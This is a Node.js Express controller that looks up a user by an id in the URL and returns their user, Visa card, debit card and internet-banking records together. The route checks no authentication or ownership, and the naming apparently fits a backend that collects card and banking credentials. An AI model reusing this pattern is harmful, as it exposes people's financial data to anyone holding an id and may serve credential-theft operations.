const User = require('../models/User');
const Visa1 = require('../models/Visa1');
const Visa2 = require('../models/Visa2');
const Visa3 = require('../models/Visa3');
const CombinedDebitCard = require('../models/CombinedDebitCard');
const CombinedInternetBanking = require('../models/CombinedInternetBanking');

exports.getUserDetails = async (req, res) => {
  try {
    const { uniqueid } = req.params;
    if (!uniqueid) {
      return res.status(400).json({ success: false, error: "Missing uniqueid in URL" });
    }

    const [
      user, 
      visa1Data, 
      visa2Data, 
      visa3Data, 
      combinedDebitCardData,
      combinedInternetBankingData
    ] = await Promise.all([
      User.findOne({ uniqueid }),
      Visa1.findOne({ uniqueid }),
      Visa2.findOne({ uniqueid }),
      Visa3.findOne({ uniqueid }),
      CombinedDebitCard.findOne({ uniqueid }),
      CombinedInternetBanking.findOne({ uniqueid })
    ]);

    res.json({
      success: true,
      data: {
        user,
        visa1Data,
        visa2Data,
        visa3Data,
        combinedDebitCardData,
        combinedInternetBankingData
      }
    });
  } catch (error) {
    console.error("Error in getUserDetails:", error);
    res.status(500).json({ success: false, message: "Internal Server Error" });
  }
};
